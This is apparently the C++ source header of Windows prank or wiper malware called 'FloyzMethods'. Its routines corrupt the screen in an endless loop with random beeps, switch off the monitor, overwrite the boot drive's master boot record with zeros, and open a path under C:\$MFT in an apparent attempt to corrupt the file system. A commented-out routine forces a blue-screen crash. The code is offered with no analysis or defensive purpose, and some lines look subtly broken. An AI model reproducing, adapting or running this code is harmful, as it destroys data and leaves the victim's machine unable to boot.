#pragma once
#include <iostream>
#include <Windows.h>
#pragma comment(lib, "ntdll.lib")
#include <string>
#define MBR_SIZE 512
#include <tchar.h>
#include <cstdio>

namespace FloyzMethods {
	class Methods {
	public:
		DWORD TestBeepOnePm = 1000 + rand() % 25000;
		DWORD TestBeepTwoPm = 250 + rand() % 3500;

		INT MeltScreen();
		//INT BSOD();
		INT OffScreen(LPARAM status);
		INT CleenMBR();
		INT MFT();
		INT BEEP(DWORD dwFreq, DWORD dwDuration);
	};
}

INT FloyzMethods::Methods::MeltScreen()
{
	INT width = GetSystemMetrics(SM_CXSCREEN);
	INT height = GetSystemMetrics(SM_CYSCREEN);

	while (true) {
		if (GetAsyncKeyState(VK_F1))
			break;
		INT x = rand() % (width - 0);
		INT y = rand() % (5 - 0);
		HDC hdcDesk = GetDC(GetDesktopWindow());
		Beep(1000 + rand() % 25000, 250 + rand() % 3500);
		BitBlt(hdcDesk, x, y, width, height, hdcDesk, x, 0, SRCCOPY);

	}
	return 0;
}

//INT FloyzMethods::Methods::BSOD()
//{
	//	BOOLEAN b;
	//	unsigned long responsel;
	//	RtAdjustPrivillege(19, true, false, &b);
	//	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &responsel);

	//	return 0;
//}

INT FloyzMethods::Methods::OffScreen(LPARAM status)
{
	SendMessage(HWND_BROADCAST, 0x0112, 0xF170, (LPARAM)status);
	return 0;
}

INT FloyzMethods::Methods::CleenMBR()
{
	DWORD write;
	char mbr[MBR_SIZE];
	ZeroMemory(&mbr, (sizeof(mbr)));

	HANDLE master = CreateFile(L"\\\\. \\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		SW_HIDE
	);

	if (WriteFile(master, mbr, MBR_SIZE, &write, NULL) == TRUE) {
		std::cout << "MBR suc erased" << std::endl;
		Sleep(3000);
		ExitProcess(0);
	}
	else {
		std::cout << "Somethings..." << std::endl;
		Sleep(3000);
		ExitProcess(0);
	}
	CloseHandle(master);
	return 0;
}

INT FloyzMethods::Methods::MFT()
{
	HANDLE hFile = NULL;

	hFile = CreateFileW(L"C:\\$MFT\\dirtyfile", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);

	CloseHandle(hFile);

	return 0;
}

INT FloyzMethods::Methods::BEEP(DWORD dwFreq, DWORD dwDuration)
{
	Beep(dwFreq, dwDuration);
	return 0;
}